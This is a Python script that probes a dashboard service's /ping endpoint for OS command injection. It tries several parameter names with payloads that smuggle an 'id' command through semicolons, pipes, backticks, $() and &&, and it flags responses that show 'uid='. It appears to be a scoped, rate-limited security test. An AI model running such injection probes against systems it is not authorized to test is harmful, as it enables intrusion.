#!/usr/bin/env python3
# INT-r27-0018 CMDI matrix probe: svc-dashboard:8006 /ping
# params x payload shapes, gentle payloads only (id). interval >= 0.25s
import http.client, json, time, urllib.parse

HOST, PORT = "svc-dashboard", 8006
PARAMS = ["host", "cmd", "ip", "target", "q"]
PAYLOADS = [
    ("base",     "127.0.0.1"),
    ("semi",     "127.0.0.1;id"),
    ("pipe",     "127.0.0.1|id"),
    ("backtick", "127.0.0.1`id`"),
    ("dollar",   "127.0.0.1$(id)"),
    ("andand",   "127.0.0.1&&id"),
]

def raw_request(path):
    return "GET %s HTTP/1.1\r\nHost: svc-dashboard:8006\r\n\r\n" % path

def get(path):
    c = http.client.HTTPConnection(HOST, PORT, timeout=6)
    try:
        c.request("GET", path)
        r = c.getresponse()
        body = r.read().decode("utf-8", "replace")
        hdrs = {k.lower(): v for k, v in r.getheaders()}
        return r.status, hdrs, body
    finally:
        c.close()

results = []

# no-param baseline EV first
st, hd, bd = get("/ping")
results.append({"case": "no_param_baseline", "path": "/ping",
                "raw_request": raw_request("/ping"), "status": st,
                "headers": hd, "body": bd[:600], "body_len": len(bd)})
time.sleep(0.3)

baselines = {}
for p in PARAMS:
    v = urllib.parse.quote("127.0.0.1", safe="")
    path = "/ping?%s=%s" % (p, v)
    st, hd, bd = get(path)
    baselines[p] = (st, bd)
    results.append({"case": "baseline:%s" % p, "path": path,
                    "raw_request": raw_request(path), "status": st,
                    "headers": hd, "body": bd[:600], "body_len": len(bd),
                    "differs_from_no_param": bd != results[0]["body"]})
    time.sleep(0.3)

hits = []
for p in PARAMS:
    b_st, b_bd = baselines[p]
    for name, val in PAYLOADS:
        if name == "base":
            continue
        v = urllib.parse.quote(val, safe="")
        path = "/ping?%s=%s" % (p, v)
        st, hd, bd = get(path)
        rec = {"case": "%s:%s" % (p, name), "payload": val, "path": path,
               "raw_request": raw_request(path), "status": st,
               "headers": hd, "body": bd[:600], "body_len": len(bd),
               "uid_present": "uid=" in bd,
               "differs_from_param_baseline": bd != b_bd}
        results.append(rec)
        if rec["uid_present"] or rec["differs_from_param_baseline"]:
            hits.append(rec["case"])
        time.sleep(0.3)

print(json.dumps({"target": "svc-dashboard:8006", "intent": "INT-r27-0018",
                  "total_requests": len(results), "hits": hits,
                  "results": results}, ensure_ascii=False, indent=1))
